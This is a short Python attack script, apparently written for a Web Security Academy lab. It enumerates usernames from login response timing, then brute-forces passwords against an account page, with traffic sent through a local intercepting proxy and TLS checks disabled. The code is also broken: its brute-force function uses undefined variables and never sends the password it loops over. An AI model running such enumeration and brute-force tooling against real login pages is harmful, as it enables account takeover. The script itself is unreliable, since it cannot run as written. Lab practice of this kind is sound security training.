import requests
import warnings

from requests.api import head

warnings.filterwarnings('ignore')
proxyDict = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

url = 'https://ac031fe71f8653cfc09d659300bc0035.web-security-academy.net/'
def bruteForce(user):
    with open('passwords.txt') as f:
        passwords = f.read().splitlines()
    for p in passwords:
        response = requests.request('GET', url+'my-account',
                                    proxies=proxyDict, verify=False, headers=header)
        if 'carlos' in str(response.content):
            print(f'[+] {response.status_code} {p} -> {encodedCookie}')       
        else:
            print(f'[-] {response.status_code} {p} -> {encodedCookie}')

def detectUser():
    with open('../usernames.txt') as f:
        users = f.read().splitlines()
    for u in users:
        formData = 'username='+u+'&password=123'
        response = requests.request('POST', url+'login',
                                    data=formData, proxies=proxyDict, verify=False)
        if response.elapsed.total_seconds() > 1:
            print (f'[+] User: {u} Delay: {response.elapsed.total_seconds()} ')
            bruteForce(u)
        else:
            print (f'[-] User: {u} Delay: {response.elapsed.total_seconds()} ')

#detectUser()
bruteForce('announce')